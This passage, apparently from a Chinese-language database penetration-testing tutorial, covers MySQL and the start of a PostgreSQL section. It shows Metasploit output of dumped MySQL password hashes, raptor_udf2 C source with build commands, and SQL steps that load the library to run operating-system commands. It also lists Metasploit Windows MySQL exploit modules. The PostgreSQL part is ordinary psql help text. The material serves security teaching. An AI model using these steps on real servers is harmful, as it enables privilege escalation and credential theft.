       RHOSTS    10.0.250.71      yes       The target address range or CIDR identifier
       RPORT     3306             yes       The target port
       THREADS   1                yes       The number of concurrent threads
       USERNAME  mysqlsec         no        The username to authenticate as
    msf auxiliary(mysql_hashdump) > run
    [+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: debian-sys-maint:*8E970943FBFAA7CF6A11A55677E8050B725D9919
    [+] 10.0.250.71:3306      - Saving HashString as Loot: phpmyadmin:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: freepbxuser:*433D16EECA646A6CCF8F024AD8CDDC070C6791C1
    [+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [+] 10.0.250.71:3306      - Saving HashString as Loot: mysqlsec:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
#### UDF权限提升
    #include 
    #include 
    enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
    typedef struct st_udf_args {
        unsigned int        arg_count;  // number of arguments
        enum Item_result    *arg_type;  // pointer to item_result
        char            **args;     // pointer to arguments
        unsigned long       *lengths;   // length of string args
        char            *maybe_null;    // 1 for maybe_null args
    } UDF_ARGS;
    typedef struct st_udf_init {
        char            maybe_null; // 1 if func can return NULL
        unsigned int        decimals;   // for real functions
        unsigned long       max_length; // for string functions
        char            *ptr;       // free ptr for func data
        char            const_item; // 0 if result is constant
    } UDF_INIT;
    int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
    {
        if (args->arg_count != 1)
            return(0);
        system(args->args[0]);
        return(0);
    }
    char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
    {
        return(0);
    }
    $ gcc -g -c raptor_udf2.c
    $ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
将上面的代码编译成一个这样的库文件。接下来，请转换为一个十六进制字符串:
    #!/usr/bin/python
    # -*- coding: utf8 -*-    
    # https://www.exploit-db.com/exploits/1518/
    # How to upload UDF DLL into mysql server ?
    # show VARIABLES;
    # select @@plugin_dir;
    # SELECT CHAR (...) INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
    # SELECT 0xnnnnn INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
    # drop function if exists do_system
    # create function do_system returns integer soname 'lib_mysqludf_sys.so';
    # select sys_exec('id');
    # How to Compile UDF Dll ?
    # gcc -g -c raptor_udf2.c
    # gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
    import sys
    import binascii
    def convert(filename):
        with open(filename) as f:
            print(binascii.hexlify(f.read()))
    if __name__ == '__main__':
        if len(sys.argv) != 2:
            print("python {} /path/to/lib_mysqludf_sys.so".format(sys.argv[0]))
        else:
            convert(sys.argv[1])
上传该文件, 并用mysql用户定义一个函数 **do_system**.
    mysql > select @@plugin_dir;
    mysql > SELECT 0x7f45........0000 INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so'
    mysql > drop function if exists do_system
    mysql > create function do_system returns integer soname 'lib_mysqludf_sys.so';
    mysql > select do_system('id > /tmp/result.log');
    mysql > select load_file('/tmp/result.log');
#### MOF权限提升
如果mysql部署在windows上，可以尝试用msf:
    msf >
    use exploit/windows/mysql/mysql_mof
    use exploit/windows/mysql/mysql_start_up
    use exploit/windows/mysql/scrutinizer_upload_exec
    use exploit/windows/mysql/mysql_payload
    use exploit/windows/mysql/mysql_yassl_hello
如果有足够的权限，还可以将数据写入os文件（启动，cron等）。
#### 参考链接
  1. 
  2. 
  3. 
  4. 
### postgresql
#### 数据库连接
请连接到 **postgresql** 数据库,
    lab:~/ $ psql -h 127.0.0.1 -U postgres -W
* * *
#### 数据库命令
    postgres=# help
    You are using psql, the command-line interface to PostgreSQL.
    Type:  \copyright for distribution terms
           \h for help with SQL commands
           \? for help with psql commands
           \g or terminate with semicolon to execute query
           \q to quit
    postgres=# \h
    Available help:
      ABORT                            CREATE FOREIGN DATA WRAPPER      DROP SEQUENCE
      ALTER AGGREGATE                  CREATE FOREIGN TABLE             DROP SERVER
      ALTER COLLATION                  CREATE FUNCTION                  DROP TABLE
      ALTER CONVERSION                 CREATE GROUP                     DROP TABLESPACE
      ALTER DATABASE                   CREATE INDEX                     DROP TEXT SEARCH CONFIGURATION
      ALTER DEFAULT PRIVILEGES         CREATE LANGUAGE                  DROP TEXT SEARCH DICTIONARY
      ALTER DOMAIN                     CREATE MATERIALIZED VIEW         DROP TEXT SEARCH PARSER
      ALTER EVENT TRIGGER              CREATE OPERATOR                  DROP TEXT SEARCH TEMPLATE
      ALTER EXTENSION                  CREATE OPERATOR CLASS            DROP TRIGGER
      ALTER FOREIGN DATA WRAPPER       CREATE OPERATOR FAMILY           DROP TYPE
      ALTER FOREIGN TABLE              CREATE ROLE                      DROP USER
      ALTER FUNCTION                   CREATE RULE                      DROP USER MAPPING
      ALTER GROUP                      CREATE SCHEMA                    DROP VIEW
      ALTER INDEX                      CREATE SEQUENCE                  END
      ALTER LANGUAGE                   CREATE SERVER                    EXECUTE
      ALTER LARGE OBJECT               CREATE TABLE                     EXPLAIN
      ALTER MATERIALIZED VIEW          CREATE TABLE AS                  FETCH
      ALTER OPERATOR                   CREATE TABLESPACE                GRANT
      ALTER OPERATOR CLASS             CREATE TEXT SEARCH CONFIGURATION INSERT
      ALTER OPERATOR FAMILY            CREATE TEXT SEARCH DICTIONARY    LISTEN
      ALTER ROLE                       CREATE TEXT SEARCH PARSER        LOAD
      ALTER RULE                       CREATE TEXT SEARCH TEMPLATE      LOCK
      ALTER SCHEMA                     CREATE TRIGGER                   MOVE
      ALTER SEQUENCE                   CREATE TYPE                      NOTIFY
      ALTER SERVER                     CREATE USER                      PREPARE
      ALTER SYSTEM                     CREATE USER MAPPING              PREPARE TRANSACTION
      ALTER TABLE                      CREATE VIEW                      REASSIGN OWNED
      ALTER TABLESPACE                 DEALLOCATE                       REFRESH MATERIALIZED VIEW
      ALTER TEXT SEARCH CONFIGURATION  DECLARE                          REINDEX
      ALTER TEXT SEARCH DICTIONARY     DELETE                           RELEASE SAVEPOINT
      ALTER TEXT SEARCH PARSER         DISCARD                          RESET
      ALTER TEXT SEARCH TEMPLATE       DO                               REVOKE
      ALTER TRIGGER                    DROP AGGREGATE                   ROLLBACK
      ALTER TYPE                       DROP CAST                        ROLLBACK PREPARED
      ALTER USER                       DROP COLLATION                   ROLLBACK TO SAVEPOINT
      ALTER USER MAPPING               DROP CONVERSION                  SAVEPOINT
      ALTER VIEW                       DROP DATABASE                    SECURITY LABEL
      ANALYZE                          DROP DOMAIN                      SELECT
      BEGIN                            DROP EVENT TRIGGER               SELECT INTO
      CHECKPOINT                       DROP EXTENSION                   SET
      CLOSE                            DROP FOREIGN DATA WRAPPER        SET CONSTRAINTS
      CLUSTER                          DROP FOREIGN TABLE               SET ROLE
      COMMENT                          DROP FUNCTION                    SET SESSION AUTHORIZATION
      COMMIT                           DROP GROUP                       SET TRANSACTION
      COMMIT PREPARED                  DROP INDEX                       SHOW
      COPY                             DROP LANGUAGE                    START TRANSACTION
      CREATE AGGREGATE                 DROP MATERIALIZED VIEW           TABLE
      CREATE CAST                      DROP OPERATOR                    TRUNCATE
      CREATE COLLATION                 DROP OPERATOR CLASS              UNLISTEN
      CREATE CONVERSION                DROP OPERATOR FAMILY             UPDATE
      CREATE DATABASE                  DROP OWNED                       VACUUM
      CREATE DOMAIN                    DROP ROLE                        VALUES
      CREATE EVENT TRIGGER             DROP RULE                        WITH
      CREATE EXTENSION                 DROP SCHEMA
    postgres=# \?
    General
      \copyright             show PostgreSQL usage and distribution terms
      \g [FILE] or ;         execute query (and send results to file or |pipe)
      \gset [PREFIX]         execute query and store results in psql variables
      \h [NAME]              help on syntax of SQL commands, * for all commands
      \q                     quit psql
      \watch [SEC]           execute query every SEC seconds
    Query Buffer
      \e [FILE] [LINE]       edit the query buffer (or file) with external editor
      \ef [FUNCNAME [LINE]]  edit function definition with external editor
      \p                     show the contents of the query buffer
      \r                     reset (clear) the query buffer
      \s [FILE]              display history or save it to file
      \w FILE                write query buffer to file
    Input/Output
      \copy ...              perform SQL COPY with data stream to the client host
      \echo [STRING]         write string to standard output
      \i FILE                execute commands from file
      \ir FILE               as \i, but relative to location of current script
      \o [FILE]              send all query results to file or |pipe
      \qecho [STRING]        write string to query output stream (see \o)
    Informational
      (options: S = show system objects, + = additional detail)
      \d[S+]                 list tables, views, and sequences
      \d[S+]  NAME           describe table, view, sequence, or index
      \da[S]  [PATTERN]      list aggregates
      \db[+]  [PATTERN]      list tablespaces
      \dc[S+] [PATTERN]      list conversions
      \dC[+]  [PATTERN]      list casts
      \dd[S]  [PATTERN]      show object descriptions not displayed elsewhere
      \ddp    [PATTERN]      list default privileges
      \dD[S+] [PATTERN]      list domains
      \det[+] [PATTERN]      list foreign tables
      \des[+] [PATTERN]      list foreign servers
      \deu[+] [PATTERN]      list user mappings
      \dew[+] [PATTERN]      list foreign-data wrappers
      \df[antw][S+] [PATRN]  list [only agg/normal/trigger/window] functions
      \dF[+]  [PATTERN]      list text search configurations
      \dFd[+] [PATTERN]      list text search dictionaries
      \dFp[+] [PATTERN]      list text search parsers
      \dFt[+] [PATTERN]      list text search templates
      \dg[+]  [PATTERN]      list roles
      \di[S+] [PATTERN]      list indexes
      \dl                    list large objects, same as \lo_list
      \dL[S+] [PATTERN]      list procedural languages
      \dm[S+] [PATTERN]      list materialized views
      \dn[S+] [PATTERN]      list schemas
      \do[S]  [PATTERN]      list operators
      \dO[S+] [PATTERN]      list collations
      \dp     [PATTERN]      list table, view, and sequence access privileges
      \drds [PATRN1 [PATRN2]] list per-database role settings
      \ds[S+] [PATTERN]      list sequences
      \dt[S+] [PATTERN]      list tables
      \dT[S+] [PATTERN]      list data types
      \du[+]  [PATTERN]      list roles
      \dv[S+] [PATTERN]      list views
      \dE[S+] [PATTERN]      list foreign tables
      \dx[+]  [PATTERN]      list extensions
      \dy     [PATTERN]      list event triggers
      \l[+]   [PATTERN]      list databases
      \sf[+] FUNCNAME        show a function's definition
      \z      [PATTERN]      same as \dp
    Formatting
      \a                     toggle between unaligned and aligned output mode
      \C [STRING]            set table title, or unset if none
      \f [STRING]            show or set field separator for unaligned query output
      \H                     toggle HTML output mode (currently off)
      \pset [NAME [VALUE]]   set table output option
                             (NAME := {format|border|expanded|fieldsep|fieldsep_zero|footer|null|
                             numericlocale|recordsep|recordsep_zero|tuples_only|title|tableattr|pager})
      \t [on|off]            show only rows (currently off)
      \T [STRING]            set HTML  tag attributes, or unset if none